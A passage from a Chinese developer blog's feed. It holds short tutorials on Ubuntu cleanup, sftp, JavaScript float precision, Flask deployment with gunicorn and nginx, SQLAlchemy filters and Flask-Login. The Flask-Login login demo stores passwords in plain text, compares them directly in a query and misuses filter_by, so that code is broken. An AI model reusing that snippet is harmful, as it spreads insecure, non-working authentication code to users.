class="headerlink" title="删除项目 delproject"></a>删除项目 delproject</h4><pre><code>curl http://localhost:6800/delproject.json -d project=secnews_spiders</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> scrapyd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu系统清理</title>
      <link href="2020/06/02/2020-06-02-ubuntu_clean/"/>
      <url>2020/06/02/2020-06-02-ubuntu_clean/</url>
      
        <content type="html"><![CDATA[<h2 id="Ubuntu系统清理"><a href="#Ubuntu系统清理" class="headerlink" title="Ubuntu系统清理"></a>Ubuntu系统清理</h2><p> Ubuntu Linux与Windows系统不同，Ubuntu Linux不会产生无用垃圾文件，但是在升级缓存中，Ubuntu Linux不会自动删除这些文件，今天就来说说这些垃圾文件清理方法。</p><p>1.移除不再需要的软件包</p><p>如果你了解过 apt-get 或 apt 命令的详细用法，应该知道 autoremove 选项。此选项可以删除「安装某个软件包时」自动安装的依赖库和包，这些自动安装的依赖包在系统中通常是无用的，只浪费磁盘空间。</p><p>这是一个自动化的傻瓜命令，可以时不时用它为 Ubuntu 系统释放一些可用硬盘空间：</p><pre><code>sudo apt autoremove</code></pre><p>2.清理Ubuntu中的APT缓存</p><p>Ubuntu 使用 APT（高级软件包工具）在系统上安装、删除和管理软件，并且在软件卸载之后它还会保留先前下载和安装软件包的缓存。</p><p>APT 包管理系统会将下载的 DEB 包缓存在 /var/cache/apt/archives 文件中，随着时间的推移，由于拥有大量不需要的包这个缓存目录可以增长得相当大。</p><p>你可以使用以下命令查看此缓存的大小：</p><pre><code>sudo du -sh /var/cache/apt</code></pre><p>对于 APT 缓存我们有两种可选方式对其进行清理，其一为只删除过时的软件包：</p><pre><code>sudo apt autoclean</code></pre><p>另一种则是清理整个缓存（释放更多的磁盘空间）：</p><pre><code>sudo apt clean</code></pre><p>3.清理缩略图缓存</p><p>为方便用户预览图片，Ubuntu 会自动为图片文件创建一个缩略图，用于在文件管理器中查看，而这些这些缩略图其实也是以文件形式隐藏存储在用户账户的 ~/.cache/thumbnails 目录当中。</p><p>如果你是摄影爱好者或是图片收藏者，随着时间的推移，缩略图的数量将大大增加。特别需要注意的是，如果你删除了某些照片或图片，这些自动生成的缩略图缓存还是会存在于磁盘当中，而不会自动清除。</p><p>你可以使用以下命令检查缩略图缓存的大小：</p><pre><code>du -sh ~/.cache/thumbnails</code></pre><p>因此，每几个月左右清除缩略图缓存是一个很好的习惯。 最快捷的方法就是使用终端命令：</p><pre><code>rm -rf ~/.cache/thumbnails/*</code></pre><p>4.手动删除老旧Linux内核（专业）</p><p>查看当前内核</p><pre><code>uname -a</code></pre><p>使用如下命令列出当前 Ubuntu 中所有已经安装的 Linux Kernel：</p><pre><code>sudo dpkg --list &#39;linux-image*&#39;*</code></pre><p>删除旧版内核与删除任何其他软件包一样：</p><pre><code>sudo apt remove linux-image-VERSION</code></pre><p>请自行将上述 VERSION 替换为要清除的内核版本，系统极客建议保持至少两个或三个最新版本内核，这样在无法使用最新内核启动系统时至少还有那么几个可替代品救急。</p><p>5.卸载不必要的应用程序</p><p>相信每个人都有那么一款和几款几乎不用的游戏或应用程序存在于系统当中。不相信？去你 Ubuntu 系统查下软件列表就知道了。其实这条也不用我多说，如果你需要更多的磁盘空间，删除那些从不使用或较少使用的应用程序总是一个好方法。</p><p>删除软件可以使用「Ubuntu 软件」或直接终端命令：</p><pre><code>sudo apt remove 软件包名</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu网卡消失 网络连接不上 </title>
      <link href="2020/06/01/2020-06-01-ubuntu_network_interface_missing/"/>
      <url>2020/06/01/2020-06-01-ubuntu_network_interface_missing/</url>
      
        <content type="html"><![CDATA[<h2 id="Ubuntu网卡消失-网络连接不上"><a href="#Ubuntu网卡消失-网络连接不上" class="headerlink" title="Ubuntu网卡消失 网络连接不上"></a>Ubuntu网卡消失 网络连接不上</h2><p>输入一下命令</p><pre><code>sudo nmcli networking offsudo nmcli networking onsudo service network-manager stopsudo rm /var/lib/NetworkManager/NetworkManager.statesudo service network-manager startsudo gedit /etc/NetworkManager/NetworkManager.conf把false改成truesudo service network-manager restart</code></pre><p>解决</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js加减乘除精度不准确解决方法</title>
      <link href="2020/05/30/2020-05-30-javascript_decimal_calculate_accuracy/"/>
      <url>2020/05/30/2020-05-30-javascript_decimal_calculate_accuracy/</url>
      
        <content type="html"><![CDATA[<h2 id="js加减乘除精度不准确解决方法"><a href="#js加减乘除精度不准确解决方法" class="headerlink" title="js加减乘除精度不准确解决方法"></a>js加减乘除精度不准确解决方法</h2><p>在项目中统计占比时，利用tofixed方法保留两位小数总是出现错误。</p><p>1、发现问题：</p><p>在测试js浮点数进行加减乘除计算时，都可能出现问题，如下：</p><pre><code>console.log(0.1 + 0.2);//0.30000000000000004console.log(1.0 - 0.9);//0.09999999999999998console.log(19.9 * 100);//1989.9999999999998console.log(6.6 / 0.2);//32.99999999999999</code></pre><p>2、不精准原因：</p><p>下面我们来说一下浮点数运算产生误差的原因：（拿0.1+0.2=0.30000000000000004进行举例）</p><p>首先，我们要站在计算机的角度思考 0.1 + 0.2 这个看似小儿科的问题。我们知道，能被计算机读懂的是二进制，而不是十进制，所以我们先把 0.1 和 0.2 转换成二进制看看：  </p><p>十进制小数转化为二进制数方法主要是小数部分乘以2，取整数部分依次从左往右放在小数点后，直至小数点后为0。</p><p>0.1 =&gt; 0.0001 1001 1001 1001…（无限循环）</p><p>0.2 =&gt; 0.0011 0011 0011 0011…（无限循环）  </p><p>上面我们发现0.1和0.2转化为二进制之后，变成了一个无限循环的数字，这在现实生活中，无限循环我们可以理解，但计算机是不允许无限循环的，对于无限循环的小数，计算机会进行舍入处理。进行双精度浮点数的小数部分最多支持 52 位，所以两者相加之后得到这么一串 0.0100 1100 1100 1100 1100 1100 1100 1100 1100 1100 1100 1100 1100 ，因浮点数小数位的限制而截断的二进制数字，这时候，我们再把它转换为十进制，就成了 0.30000000000000004。</p><p>3、解决办法：</p><p>编写方法floatObj，思路是把小数放大为整数（乘），进行算术运算，再缩小为小数（除）</p><pre><code>var floatObj = function () &#123;/** 判断obj是否为一个整数*/function isInteger(obj) &#123;return Math.floor(obj) === obj&#125;/** 将一个浮点数转成整数，返回整数和倍数。如 3.14 &gt;&gt; 314，倍数是 100* @param floatNum &#123;number&#125; 小数* @return &#123;object&#125;* &#123;times:100, num: 314&#125;*/function toInteger(floatNum) &#123;var ret = &#123;times: 1, num: 0&#125;;if (isInteger(floatNum)) &#123;ret.num = floatNum;return ret&#125;var strfi = floatNum + &#39;&#39;;var dotPos = strfi.indexOf(&#39;.&#39;);var len = strfi.substr(dotPos + 1).length;var times = Math.pow(10, len);var intNum = parseInt(floatNum * times + 0.5, 10);ret.times = times;ret.num = intNum;return ret&#125;/** 核心方法，实现加减乘除运算，确保不丢失精度* 思路：把小数放大为整数（乘），进行算术运算，再缩小为小数（除）** @param a &#123;number&#125; 运算数1* @param b &#123;number&#125; 运算数2* @param op &#123;string&#125; 运算类型，有加减乘除（add/subtract/multiply/divide）**/function operation(a, b, op) &#123;var o1 = toInteger(a);var o2 = toInteger(b);var n1 = o1.num;var n2 = o2.num;var t1 = o1.times;var t2 = o2.times;var max = t1 &gt; t2 ? t1 : t2;var result = null;switch (op) &#123;case &#39;add&#39;:if (t1 === t2) &#123; // 两个小数位数相同result = n1 + n2&#125; else if (t1 &gt; t2) &#123; // o1 小数位 大于 o2result = n1 + n2 * (t1 / t2)&#125; else &#123; // o1 小数位 小于 o2result = n1 * (t2 / t1) + n2&#125;return result / max;case &#39;subtract&#39;:if (t1 === t2) &#123;result = n1 - n2&#125; else if (t1 &gt; t2) &#123;result = n1 - n2 * (t1 / t2)&#125; else &#123;result = n1 * (t2 / t1) - n2&#125;return result / max;case &#39;multiply&#39;:result = (n1 * n2) / (t1 * t2);return result;case &#39;divide&#39;:result = (n1 / n2) * (t2 / t1);return result&#125;&#125;// 加减乘除的四个接口function add(a, b) &#123;return operation(a, b, &#39;add&#39;)&#125;function subtract(a, b) &#123;return operation(a, b, &#39;subtract&#39;)&#125;function multiply(a, b) &#123;return operation(a, b, &#39;multiply&#39;)&#125;function divide(a, b) &#123;return operation(a, b, &#39;divide&#39;)&#125;// exportsreturn &#123;add: add,subtract: subtract,multiply: multiply,divide: divide&#125;&#125;();</code></pre><p>调用方法：</p><pre><code>console.log(floatObj.add(0.1, 0.2));//0.3console.log(floatObj.subtract(1.0, 0.9));//0.1console.log(floatObj.multiply(19.9, 100));//1990console.log(floatObj.divide(6.6, 0.2));//33</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx + gunicorn + Flask 快速部署实现上线</title>
      <link href="2020/05/29/2020-05-29-flask_gunicorn_nginx_deploy/"/>
      <url>2020/05/29/2020-05-29-flask_gunicorn_nginx_deploy/</url>
      
        <content type="html"><![CDATA[<h2 id="Nginx-gunicorn-Flask-快速部署实现上线"><a href="#Nginx-gunicorn-Flask-快速部署实现上线" class="headerlink" title="Nginx + gunicorn + Flask 快速部署实现上线"></a>Nginx + gunicorn + Flask 快速部署实现上线</h2><p>flask项目目前主流的部署方式有：</p><ul><li>flask + uwsgi + Nginx</li><li>flask + gunicorn + Nginx</li><li>flask + mod-wsgi + Apache</li></ul><p>之前一直在用nginx + uwsgi + flask 架构 , 但利用flask蓝图编写多个子模块，注册工厂函数，再次部署出现问题，便改用gunicorn部署。</p><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><pre><code>编写程序入口run:app,供gunicorn使用。 # run.pyfrom flask import Flaskdef create_app():    # 这个工厂方法可以从你的原有的 `__init__.py` 或者其它地方引入。    app = Flask(__name__)    return appapp = create_app()if __name__ == &#39;__main__&#39;:    app.run()</code></pre><h3 id="gunicorn-WSGI"><a href="#gunicorn-WSGI" class="headerlink" title="gunicorn WSGI"></a>gunicorn WSGI</h3><p>gunicorn绿色独角兽，是一个Python WSGI UNIX的HTTP服务器。这是一个pre-fork worker的模型，从Ruby的独角兽（Unicorn）项目移植。该Gunicorn服务器大致与各种Web框架兼容，只需非常简单的执行，轻量级的资源消耗，以及相当迅速。</p><p>安装 </p><pre><code>pip install gunicorn</code></pre><p>运行</p><pre><code>gunicorn -w 50 -b 0.0.0.0:8080 run:app --reload -t 500 -D --access-logfile log/gunicorn.log</code></pre><p>以上启动命令的含义为：</p><pre><code>-w 50 开启50个进程0.0.0.0:8080 定义8080端口run:app run就是引导用的python文件名称（不包括后缀/模块名）,app就是Flask实例的名称。这样gunicorn就会找到具体要host哪一个flask实例–realod 监听到项目文件变动自动重启gunicorn 使之生效-t 500 配置每个请求的超时时间为500秒-D 让命令后台执行–access-logfile log/gunicorn.log 将请求日志保存到该文件中</code></pre><p>以上我们就可以使用8080端口来访问我们的接口，到这里已经差不多了，但是我们还需要在web最外层用nginx 做下代理提升静态文件的web性能。</p><h3 id="nginx最外层代理"><a href="#nginx最外层代理" class="headerlink" title="nginx最外层代理"></a>nginx最外层代理</h3><p>nginx相关的配置博客里已经有很多了，在这里再贴一个我的最简配置吧：</p><pre><code>worker_processes 4;events &#123; worker_connections 1024; &#125;http &#123;    include      mime.types;    default_type  application/octet-stream;    server &#123;        listen 80;        server_name www.secnewsboard.com;        location / &#123;            proxy_pass  http://127.0.0.1:8080;            access_log /media/mamba/Data1/secnewsboard/log/api_access.log;            proxy_read_timeout 300;        &#125;    &#125;&#125;</code></pre><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p>执行命令</p><pre><code>sudo pkill -9 nginxsudo nginx -c /etc/nginx/nginx.confgunicorn -w 50 -b 0.0.0.0:8080 run:app --reload -t 500 -D --access-logfile log/gunicorn.log</code></pre><p>访问服务器ip即可</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用sftp在本地和服务器之间传输文件</title>
      <link href="2020/05/28/2020-05-28-sftp_transfer_files_to_remote_machine/"/>
      <url>2020/05/28/2020-05-28-sftp_transfer_files_to_remote_machine/</url>
      
        <content type="html"><![CDATA[<h2 id="利用sftp在本地和服务器之间传输文件"><a href="#利用sftp在本地和服务器之间传输文件" class="headerlink" title="利用sftp在本地和服务器之间传输文件"></a>利用sftp在本地和服务器之间传输文件</h2><p>登录</p><pre><code>#密码登录sftp -P 22 zhangsan@192.168.0.100#秘钥登录sftp -P 22 -i ~/.ssh/id_rsa zhangsan@192.168.0.100</code></pre><p>更改远程工作目录</p><pre><code>cd /abc</code></pre><p>更改和/或打印本地工作目录</p><pre><code>lcd /abc</code></pre><p>列出远程目录的内容</p><pre><code>ls</code></pre><p>列出本地目录的内容</p><pre><code>lls</code></pre><p>打印远程工作目录</p><pre><code>pwd</code></pre><p>打印本地工作目录</p><pre><code>lpwd</code></pre><p>将文件从服务器下载到本地计算机</p><pre><code>#把sftp服务器上test.txt文件下载到本地get /tmp/test.txt ~/#把sftp服务器上test文件下载到本地get -r /tmp/test/ ~/</code></pre><p>将文件从本地计算机上载到服务器</p><pre><code>#把本地文件test.txt上传到ftp服务器/tmp目录下put ~/test.txt /tmp/#把本地文件test上传到sftp服务器/tmp目录下put -r ~/test /tmp/</code></pre><p>在远程服务器上创建一个目录abc</p><pre><code>mkdir abc</code></pre><p>移动或重命名远程服务器上的文件</p><pre><code>mv /test.txt /abc.txt</code></pre><p>移动或重命名远程服务器上的文件</p><pre><code>rename /test.txt /abc.txt</code></pre><p>删除远程服务器上的文件abc.txt</p><pre><code>rm abc.txt</code></pre><p>删除远程服务器上的目录abc</p><pre><code>rmdir abc</code></pre><p>给予帮助</p><pre><code>help</code></pre><p>清理屏幕</p><pre><code>clear</code></pre><p>完成您的SFTP会话，即断开连接</p><pre><code>bye、exit、quit、!</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sftp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootstrap-datepicker显示中文</title>
      <link href="2020/05/21/2020-05-21-bootstrap-datepicker_language/"/>
      <url>2020/05/21/2020-05-21-bootstrap-datepicker_language/</url>
      
        <content type="html"><![CDATA[<h2 id="bootstrap-datepicker显示中文"><a href="#bootstrap-datepicker显示中文" class="headerlink" title="bootstrap-datepicker显示中文"></a>bootstrap-datepicker显示中文</h2><p>引入所需要的库</p><pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/css/bootstrap-datepicker.min.css&quot;  type=&quot;text/css&quot;&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/js/bootstrap-datepicker.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/locales/bootstrap-datepicker.zh-CN.min.js&quot;&gt;&lt;/script&gt;</code></pre><p>然后是在datepicker中设置language: ‘zh-CN’：</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;$(&#39;#start&#39;).datepicker(    &#123;        language: &#39;zh-CN&#39;,        autoclose: true,        format: &quot;yyyy-mm&quot;,        startView: 3,        minViewMode: 1,        maxViewMode: 2,        clearBtn: true,        todayBtn: false,        endDate: date    &#125;);&lt;/script&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Font Awesome图标库使用</title>
      <link href="2020/05/21/2020-05-21-font_awesome/"/>
      <url>2020/05/21/2020-05-21-font_awesome/</url>
      
        <content type="html"><![CDATA[<h2 id="Font-Awesome图标库使用"><a href="#Font-Awesome图标库使用" class="headerlink" title="Font Awesome图标库使用"></a>Font Awesome图标库使用</h2><p>Font Awesome是一套绝佳的图标字体库和CSS框架，提供可缩放的矢量图标，可以使用CSS所提供的所有特性对它们进行更改，包括：大小、颜色、阴影或者其它任何支持的效果。 </p><p>在<a href="http://www.fontawesome.com.cn/">Font Awesome中文网</a>下载文件，旧版可以免费下载使用。</p><p>使用方法：</p><p>1.将下载好的 font-awesome 包解压，复制 font-awesome 目录到你的项目中。</p><p>2.在<head>处加载font-awesome.min.css如下。 </p><pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;path/to/font-awesome/css/font-awesome.min.css&quot;&gt;</code></pre><p>3.可以通过设置CSS前缀fa和图标的具体名称，来把Font Awesome 图标放在任意位置。Font Awesome 被设计为用于行内元素（我们喜欢用更简短的<i>标签，它的语义更加精准）。 </p><p><i class="fa fa-camera-retro"></i> </p><p>其他效果如修改图标大小、固定图标宽度、无序列表图标、引用特效、图标旋转、实现加载效果、多个图标组合等可查阅网址 <a href="http://www.fontawesome.com.cn/examples/">http://www.fontawesome.com.cn/examples/</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask SQLAlchemy 查询语句</title>
      <link href="2020/05/20/2020-05-20-flask_SQLAlchemy_query/"/>
      <url>2020/05/20/2020-05-20-flask_SQLAlchemy_query/</url>
      
        <content type="html"><![CDATA[<h2 id="flask-SQLAlchemy-查询语句"><a href="#flask-SQLAlchemy-查询语句" class="headerlink" title="flask SQLAlchemy 查询语句"></a>flask SQLAlchemy 查询语句</h2><p>常用的filter操作符</p><p>下面的这些操作符可以应用在filter函数中</p><p>equals:</p><pre><code>query.filter(User.name == &#39;ed&#39;)</code></pre><p>not equals:</p><pre><code>query.filter(User.name != &#39;ed&#39;)</code></pre><p>LIKE:</p><pre><code>query.filter(User.name.like(&#39;%ed%&#39;))</code></pre><p>IN:</p><pre><code>query.filter(User.name.in_([&#39;ed&#39;, &#39;wendy&#39;, &#39;jack&#39;]))# works with query objects too:query.filter(User.name.in_(        session.query(User.name).filter(User.name.like(&#39;%ed%&#39;))))</code></pre><p>NOT IN:</p><pre><code>query.filter(~User.name.in_([&#39;ed&#39;, &#39;wendy&#39;, &#39;jack&#39;]))</code></pre><p>IS NULL:</p><pre><code>query.filter(User.name == None)# alternatively, if pep8/linters are a concernquery.filter(User.name.is_(None))</code></pre><p>IS NOT NULL:</p><pre><code>query.filter(User.name != None)# alternatively, if pep8/linters are a concernquery.filter(User.name.isnot(None))</code></pre><p>AND:</p><pre><code># use and_()from sqlalchemy import and_query.filter(and_(User.name == &#39;ed&#39;, User.fullname == &#39;Ed Jones&#39;))# or send multiple expressions to .filter()query.filter(User.name == &#39;ed&#39;, User.fullname == &#39;Ed Jones&#39;)# or chain multiple filter()/filter_by() callsquery.filter(User.name == &#39;ed&#39;).filter(User.fullname == &#39;Ed Jones&#39;)</code></pre><p>OR:</p><pre><code>from sqlalchemy import or_query.filter(or_(User.name == &#39;ed&#39;, User.name == &#39;wendy&#39;))</code></pre><p>MATCH:</p><pre><code>query.filter(User.name.match(&#39;wendy&#39;))</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask-Login使用</title>
      <link href="2020/05/20/2020-05-20-flask_login/"/>
      <url>2020/05/20/2020-05-20-flask_login/</url>
      
        <content type="html"><![CDATA[<h2 id="Flask-Login使用"><a href="#Flask-Login使用" class="headerlink" title="Flask-Login使用"></a>Flask-Login使用</h2><h3 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h3><p>1.安装</p><pre><code>pip install flask-login</code></pre><p>2.配置</p><p>使用Flask-Login的应用程序中最重要的部分是LoginManager类(登录管理器)，然后对app进行配置。</p><pre><code>from flask import Flaskfrom flask_login import LoginManagerapp = Flask(__name__)  # 实例化一个flask对象app.config[&quot;SECRET_KEY&quot;] = &#39;雅蠛蝶&#39;  # 设置session的secret keylogin_manager = LoginManager()  # 实例化一个登录的管理实例login_manager.init_app(app)</code></pre><p>默认情况下，Flask-Login使用 sessions 进行身份验证。也就是数说你必须在app上设置 secret key，否则Flask会向您显示一条错误消息。</p><p>3.user_loader 回调函数</p><p>user session 记录的是用户 ID (user_id)，回调函数的作用就是通过 user_id 返回对应的 User 对象。把返回的user对象存储到session中。user_loader 回调函数在 user_id 非法的时候不应该抛出异常，而要返回 None。没有这个回调函数的话，Flask-Login 将无法工作。</p><pre><code>@login_manager.user_loaderdef user_loader(user_id):    from user.models import User  # 导入User表    user = User.query.get(int(user_id))    return user</code></pre><p>4.User类的实现</p><p>使用flask-login插件需要User类的实现以下几个属性和方法：</p><ul><li>is_authenticated：属性，用来判断是否是已经授权了，如果通过授权就会返回true</li><li>is_active： 属性，判断是否已经激活</li><li>is_anonymous： 属性，判断是否是匿名用户</li><li>get_id()： 方法，返回用户的唯一标识</li></ul><p>当然，这些属性和方法也可以直接继承于userMixin的默认方法和属性，不用自己去实现。</p><pre><code>from flask_login import UserMixinclass User(UserMixin,db.Model):  # db是flask-sqlalchemy的实例    id = db.Column(db.Integer, primary_key=True)    username = db.Column(db.String(80), unique=True, nullable=False)    email = db.Column(db.String(120), unique=True, nullable=False)    password= db.Column(db.String(128))    avatar_hash = db.Column(db.String(32))    def __init__(self,id,username,email):        self.id = id        self.username = username        self.email = email    def __repr__(self):        return &#39;&lt;User %r&gt;&#39; % self.username</code></pre><h3 id="flask-login的应用"><a href="#flask-login的应用" class="headerlink" title="flask-login的应用"></a>flask-login的应用</h3><p>1.登录Demo</p><pre><code># 用户进行身份验证后，你可以使用该login_user 功能登录。from flask import requestfrom test.models import User  # 导入User类@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def login():    # Here we use a class of some kind to represent and validate our    # client-side form data. For example, WTForms is a library that will    # handle this for us, and we use a custom LoginForm to validate.    form = LoginForm()    if form.validate():        # Login and validate the user.        # user should be an instance of your `User` class        username = request.form.get(&#39;username&#39;)        password = request.form.get(&#39;password&#39;)        user = User.query.filter_by(User.username==username, User.password==password).first()        login_user(user)  # 登录        flask.flash(&#39;Logged in successfully.&#39;)        next = flask.request.args.get(&#39;next&#39;)        # is_safe_url should check if the url is safe for redirects.        # See http://flask.pocoo.org/snippets/62/ for an example.        if not is_safe_url(next):            return flask.abort(400)        return flask.redirect(next or flask.url_for(&#39;index&#39;))    return flask.render_template(&#39;login.html&#39;, form=form)</code></pre><p>这里的是登陆的请求操作，通过用户查询，判断是否有权限，然后通过login_user(user)，其实也是调用user_loader()把用户设置到session中。</p><p>这里的next参数可能有安全问题而不能直接跳转，可以考虑使用is_safe_url去过滤。</p><p>2.使用flask-login登陆后的一些参数和方法</p><p>登陆后的用户，默认提供了current_user的用户代理方法，在每个模板中都可以直接使用：</p><pre><code>&#123;% if current_user.is_authenticated %&#125;    Hi &#123;&#123; current_user.name &#125;&#125;!    &#123;% endif %&#125;</code></pre><p>需要用户登录的视图可以使用 @login_required 来装饰</p><pre><code>@app.route(&quot;/settings&quot;)@login_requireddef settings():    pass</code></pre><p>注销用户，logout_user()，这样会清除cookie和session</p><pre><code>@app.route(&quot;/logout&quot;)@login_requireddef logout():    logout_user()    return redirect(somewhere)</code></pre><p>3.自定义登录操作</p><pre><code># 设置登陆视图，用于未授权操作的跳转(即用户未登录时，默认跳转到哪里)login_manager.login_view = &quot;auth.login&quot;# 设置快闪消息，用于提示用户login_manager.login_message = u&quot;Please login to access this page.&quot;# 可以设置None,&#39;basic&#39;,&#39;strong&#39;以提供不同的安全等级login_manager.session_protection = &quot;basic&quot;# 自定义消息类别login_manager.login_message_category = &quot;info&quot;&quot;&quot;&quot;就是在登陆页面的重定向时候，可以携带到登陆请求的参数，例如在一个用户页面，session过期，这是要跳转到登陆页面，那么会把当前的链接当参数存放到next里面传递到登陆请求中。当然了，这里还可以设置USE_SESSION_FOR_NEXT =True 这样就把链接放session里面了；而这些可携带参数链接必须在info的路径下。&quot;&quot;&quot;</code></pre><p>4.使用Request Loader自定义登录</p><p>有时候你想要不使用cookies来登录用户，比如使用头部值或者作为查询参数传递的api键值。 在这些情况下，您应该使用request_loader回调。 这个回调应该和你的user_loader回调一样，只是它接受Flask请求而不是user_id。</p><p>举个例子，你可以通过路径的参数或者请求头里携带的Authorzation消息进行验证用户：</p><pre><code>@login_manager.request_loaderdef load_user_from_request(request):    # first, try to login using the api_key url arg    api_key = request.args.get(&#39;api_key&#39;)    if api_key:        user = User.query.filter_by(api_key=api_key).first()        if user:            return user    # next, try to login using Basic Auth    api_key = request.headers.get(&#39;Authorization&#39;)    if api_key:        api_key = api_key.replace(&#39;Basic &#39;, &#39;&#39;, 1)        try:            api_key = base64.b64decode(api_key)        except TypeError:            pass        user = User.query.filter_by(api_key=api_key).first()        if user:            return user    # finally, return None if both methods did not login the user    return None</code></pre><p>5.匿名用户</p><p>默认情况下，当用户实际未登录时，current_user 将设置为 AnonymousUserMixin 对象。它具有以下属性和方法：</p><ul><li>is_active并且is_authenticated是 False</li><li>is_anonymous 是 True</li><li>get_id() 回报  None</li></ul><p>如果您对匿名用户有自定义要求（例如，他们需要具有权限字段），您可以提供一个可调用的（类或工厂函数），用于创建匿名用户 LoginManager</p><pre><code>login_manager.anonymous_user = MyAnonymousUser</code></pre><p>6.记住我(remember)</p><p>默认情况下，当用户关闭浏览器时，Flask会话将被删除，用户将被注销。“记住我”可防止用户在关闭浏览器时意外退出。但这不意味着记忆或预填充用户的用户名和密码在登录表单的用户注销之后。</p><p>“记住我”功能可能很难实现。但是，Flask-Login使它几乎透明 - 只需  remember=True 转到 login_user 呼叫。Cookie将保存在用户的计算机上，然后Flask-Login将自动从该cookie恢复用户ID（如果该cookie不在会话中）。cookie过期前的时间可以使用  REMEMBER_COOKIE_DURATION 配置进行设置， 也可以传递给它 login_user。cookie是防篡改的，因此如果用户篡改它（即插入别人的用户ID代替他们自己的用户ID），cookie就会被拒绝，就好像它不存在一样。</p><p>该级别的功能将自动处理。但是，你可以（并且应该，如果你的应用程序处理任何类型的敏感数据）提供额外的基础结构，以提高您记住的cookie的安全性。</p><p>7.替代Tokens</p><p>使用用户ID作为记忆令牌的值意味着您必须更改用户的ID以使其登录会话无效。一种改进方法是使用备用用户ID而不是用户ID。例如：</p><pre><code>@login_manager.user_loaderdef load_user(user_id):    return User.query.filter_by(alternative_id=user_id).first()</code></pre><p>然后，User类下的 get_id 方法将返回替代ID而不是用户的主ID：</p><pre><code>def get_id(self):    return unicode(self.alternative_id)</code></pre><p>这样，当用户更改密码时，您可以自由地将用户的替代ID更改为新的随机生成的值，这将确保其旧的身份验证会话将不再有效。请注意，替代ID仍必须唯一标识用户…将其视为第二个用户ID。</p><p>8.Fresh Logins</p><p>当用户登录时，他们的会话被标记为“新鲜”，这表示他们实际上在该会话上进行了身份验证。当他们的会话被销毁并且他们用“记住我”cookie重新登录时，它被标记为“非新鲜”。login_required 不区分新鲜度，这对大多数页面来说都很好。但是，更改个人信息等敏感操作应该需要重新登录。（无论如何，更改密码等操作都需要重新输入密码。）</p><p>fresh_login_required，除了验证用户是否已登录外，还将确保其登录是新鲜的。如果没有，它会将它们发送到可以重新输入凭据的页面。您可以自定义其行为在相同的方式，你可以自定义login_required，通过设置 LoginManager.refresh_view，needs_refresh_message以及 needs_refresh_message_category：</p><pre><code>login_manager.refresh_view = &quot;accounts.reauthenticate&quot;login_manager.needs_refresh_message = (    u&quot;To protect your account, please reauthenticate to access this page.&quot;)login_manager.needs_refresh_message_category = &quot;info&quot;</code></pre><p>或者通过提供自己的回调来处理刷新</p><pre><code>@login_manager.needs_refresh_handlerdef refresh():    # do stuff    return a_response</code></pre><p>要将会话再次标记为新鲜，请调用  flask_login.confirm_login 函数。</p><p>9.Cookie设置</p><ul><li>REMEMBER_COOKIE_NAME</li></ul><p>存储“记住我”信息的 cookie 名。 默认值： remember_token</p><ul><li>REMEMBER_COOKIE_DURATION</li></ul><p>cookie过期时间，为一个 datetime.timedelta 对象。 默认值： 365 天 (1 非闰阳历年)</p><ul><li>REMEMBER_COOKIE_DOMAIN</li></ul><p>如果“记住我” cookie 应跨域，在此处设置域名值 （即 .example.com 会允许 example 下所有子域 名）。 默认值： None</p><ul><li>REMEMBER_COOKIE_PATH</li></ul><p>限制”记住我“ cookie 存储到某一路径下。 默认值： /</p><ul><li>REMEMBER_COOKIE_SECURE</li></ul><p>限制 “Remember Me” cookie 在某些安全通道下有用 （典型地 HTTPS）。默认值： None </p><ul><li>REMEMBER_COOKIE_HTTPONLY</li></ul><p>保护 “Remember Me” cookie 不能通过客户端脚本访问。 默认值： 